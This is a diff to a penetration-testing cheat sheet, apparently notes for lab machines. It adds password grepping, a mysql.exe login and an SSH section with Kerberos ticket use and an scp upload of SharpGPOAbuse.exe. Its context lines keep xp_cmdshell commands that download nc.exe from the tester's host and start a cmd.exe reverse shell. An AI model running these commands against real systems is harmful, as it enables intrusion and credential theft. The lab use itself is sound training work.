@@ -31,6 +31,7 @@
   * <<xfreerdp, XfreeRDP>>
 - <<database, Databases>>
 - <<forwarding, Port-Forwarding and Sliver C2>>
+- <<ssh, SSH>>
 - <<privesc, Privilage Escalation>>
 
 [[overview]]
@@ -56,6 +57,12 @@ Default *UDP* ports scanning
 
 ```bash
 nmap -sU --top-ports 100 -sC -sV $target          
+```
+
+Search file with string password
+
+```bash
+cd wapt && grep -R 'password'
 ```
 
 [[creds]]
@@ -715,6 +722,12 @@ xp_cmdshell "powershell wget http://$your_ip/nc.exe -OutFile c:\UsersPublic\nc.e
 xp_cmdshell  "c:\UsersPublic\nc.exe -e cmd.exe $your_ip &your_port"
 ```
 
+Also if is finded a mysql.exe and creds
+
+```bash
+c:\path\to\mysql.exe -u username -p password -e 'show databases;'
+```
+
 [[forwarding]]
 == Port-Forwarding and Sliver C2
 
@@ -778,6 +791,40 @@ $session_id looks like `5b4640a8`
 
 
 Sliver C2 configured in proxy `SOCKS5` so need to change a `/etc/proxychains.conf` to `SOCKS5` in port `1081`
+
+[[ssh]]
+== SSH
+
+When a port `22` is open in Windows machine it can be connected the same as in linux machines
+
+```bash
+ssh username@target_ip
+```
+
+Kerberos auth to `ssh`
+
+```bash
+KRB5CCNAME=user.ccache ssh -K username@domain  -v
+```
+
+Also file can be exported
+
+```bash
+export KRB5CCNAME=user.ccache 
+```
+
+Copy a file from `ssh` connection
+
+```bash
+scp username@remote:/file/to/receive /where/to/put/locally
+```
+
+Download a file from `ssh` connection
+
+```bash
+scp -P 22 ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/PATH/TO/FILE/"
+```
+
 
 
 [[privesc]]
